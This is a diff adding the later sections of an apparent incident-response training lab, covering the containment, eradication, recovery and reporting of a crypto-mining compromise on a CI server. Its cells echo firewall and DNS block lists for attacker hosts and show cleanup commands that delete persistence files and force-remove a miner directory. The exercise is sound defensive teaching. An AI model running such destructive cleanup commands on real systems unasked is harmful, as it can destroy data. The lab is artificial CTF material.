+<h2>12. Contain</h2>
+<ul>
+<li>&#9744; Remove the port forward so the CI server is no longer on the internet</li>
+<li>&#9744; Block the dropper host, the pool and the attacker address</li>
+<li>&#9744; Disable the admin account and end its sessions</li>
+<li>&#9744; Revoke every secret in credentials.xml now: assume they are stolen</li>
+</ul>
+<p>The cell prints the commands for the real systems. Nothing here touches a real firewall.</p>
+<blockquote>
+<p>Hint: Contain the way in first (the port forward), then the outbound paths (pool and dropper), then the stolen secrets.</p>
+</blockquote>
+<pre><code>echo &quot;firewall nat delete ci.brightloom.test:8080&quot;
+for ip in 203.0.113.99 198.51.100.23 198.51.100.77; do
+    echo &quot;iptables -A OUTPUT -d $ip -j DROP&quot;
+    echo &quot;iptables -A INPUT -s $ip -j DROP&quot;
+done
+echo &quot;dns-block add hashmoat.example&quot;
+echo &quot;dns-block add sysupdate-mirror.example&quot;
+echo &quot;forgeway-cli disable-user admin --kill-sessions&quot;
+echo &quot;rotate: every token and key in /var/lib/forgeway/credentials.xml&quot;</code></pre>
+<p class="lab">Expected output</p><pre class="want">firewall nat delete ci.brightloom.test:8080
+iptables -A OUTPUT -d 203.0.113.99 -j DROP
+iptables -A INPUT -s 203.0.113.99 -j DROP
+iptables -A OUTPUT -d 198.51.100.23 -j DROP
+iptables -A INPUT -s 198.51.100.23 -j DROP
+iptables -A OUTPUT -d 198.51.100.77 -j DROP
+iptables -A INPUT -s 198.51.100.77 -j DROP
+dns-block add hashmoat.example
+dns-block add sysupdate-mirror.example
+forgeway-cli disable-user admin --kill-sessions
+rotate: every token and key in /var/lib/forgeway/credentials.xml</pre>
+<h2>13. Eradicate</h2>
+<p>Remove all three ways back in, then the miner. Order matters: stop the service and the cron entry before you kill the process, or they start it again.</p>
+<ul>
+<li>&#9744; Remove the cron file and the systemd unit</li>
+<li>&#9744; Remove the attacker's SSH key, keep the real one</li>
+<li>&#9744; Delete the miner and its config</li>
+<li>&#9744; Remove the NOPASSWD sudo rule</li>
+</ul>
+<blockquote>
+<p>Hint: <code>grep -v</code> prints every line that does NOT match, so it keeps the good key.</p>
+</blockquote>
+<pre><code>echo &quot;systemctl disable --now sysupdate.service&quot;
+rm -f persist/etc_cron.d_sysupdate persist/sysupdate.service
+grep -v Hq7mXbV0 persist/root_authorized_keys &gt; /tmp/keys &amp;&amp; mv /tmp/keys persist/root_authorized_keys
+echo &#x27;forgeway ALL=(root) NOPASSWD: /usr/bin/docker&#x27; &gt; persist/sudoers.d_forgeway
+rm -f suspect/config.json
+echo &quot;kill 4242; rm -rf /var/tmp/.cache&quot;
+echo ---
+ls persist
+cat persist/root_authorized_keys</code></pre>
+<p class="lab">Expected output</p><pre class="want">systemctl disable --now sysupdate.service
+kill 4242; rm -rf /var/tmp/.cache
+---
+crontab_forgeway.txt  root_authorized_keys  sudoers.d_forgeway
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMd2Pz8kQwErTy5uIoPa3SdFgHjKl9ZxCvBnM1qW2eRt ops@brightloom.test</pre>
+<h2>14. Recover</h2>
+<p>A server where someone was root can't be fully trusted again. The safe path is to rebuild it.</p>
+<ul>
+<li>&#9744; Rebuild build01 from a clean image and restore only the job configs</li>
+<li>&#9744; Put Forgeway behind the VPN, with single sign-on and MFA; lock accounts after failed sign-ins</li>
+<li>&#9744; Give the CI user only the sudo it needs (or none: run builds in containers)</li>
+<li>&#9744; Watch: CPU on build servers, outbound connections to port 3333, new cron files and systemd units</li>
+</ul>
+<blockquote>
+<p>Hint: Builds were 6x slower. Check that build times are back to normal after the rebuild: that is your recovery test.</p>
+</blockquote>
+<h2>15. Report</h2>
+<ul>
+<li>&#9744; Timeline from 01:49 to 08:30 with sources</li>
+<li>&#9744; Root cause: internet-facing CI, weak admin password, no lockout, NOPASSWD sudo</li>
+<li>&#9744; Indicators: addresses, domains, wallet, file hashes, SSH key</li>
+<li>&#9744; Submit the flag from step 7 on the CTF board</li>
+</ul>
+<p>Write the report here. Download .ipynb keeps every output above.</p>
+<h2>16. Lessons learned</h2>
+<ul>
+<li>&#9744; How did the attack happen, start to finish?</li>
+<li>&#9744; What went well in the response?</li>
+<li>&#9744; What would you do differently next time?</li>
+<li>&#9744; Which fixes stop it happening again? Who owns each one, and by when?</li>
+<li>&#9744; Which early warning signs should be watched from now on?</li>
+</ul>
+<h2>17. Artifacts and analyst note</h2>
+<p>List every indicator you found so others can search for it.</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+<th>Where you found it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IP address</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Domain</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>File hash</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Account</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Analyst note:</strong> write two or three sentences for the next analyst who picks this up.</p></main></body>
+</html>
